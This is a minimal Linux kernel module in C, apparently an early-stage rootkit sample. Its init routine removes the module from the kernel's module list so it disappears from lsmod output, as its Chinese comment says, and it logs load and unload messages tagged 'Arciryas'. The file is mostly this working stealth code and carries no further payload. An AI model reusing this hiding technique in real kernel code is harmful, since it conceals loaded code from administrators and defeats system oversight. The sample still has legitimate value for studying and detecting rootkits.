#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/proc_fs.h>
#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/list.h>

static int lkm_init(void)
{
    list_del_init(&__this_module.list); //从lsmod命令中隐藏模块
    printk("Arciryas:module loaded\n");
    return 0;
}


static void lkm_exit(void)
{
    printk("Arciryas:module removed\n");
}

module_init(lkm_init);
module_exit(lkm_exit);
